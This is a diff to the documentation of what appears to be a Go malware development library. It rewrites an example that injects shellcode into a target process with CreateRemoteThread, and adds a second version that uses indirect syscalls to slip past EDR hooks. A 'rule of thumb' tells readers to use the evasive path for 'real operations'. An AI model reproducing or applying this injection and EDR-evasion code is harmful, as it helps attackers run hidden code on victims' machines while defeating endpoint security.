@@ -47,12 +47,19 @@ The most important concept in maldev. Every function that calls Windows NT sysca
 
 ```go
 // Without Caller — uses standard WinAPI (hookable by EDR)
-inject.SomeTechnique(pid, shellcode, nil)
+injector, _ := inject.NewInjector(&inject.Config{
+    Method: inject.MethodCreateRemoteThread,
+    PID:    pid,
+})
+injector.Inject(shellcode)
 
 // With Caller — routes through indirect syscalls (bypasses EDR hooks)
-caller := wsyscall.New(wsyscall.MethodIndirect,
-    wsyscall.Chain(wsyscall.NewHashGate(), wsyscall.NewHellsGate()))
-inject.SomeTechnique(pid, shellcode, caller)
+injector, _ = inject.Build().
+    Method(inject.MethodCreateRemoteThread).
+    PID(pid).
+    IndirectSyscalls().
+    Create()
+injector.Inject(shellcode)
 ```
 
 **Rule of thumb**: Always create a Caller for real operations. Pass `nil` only for testing.
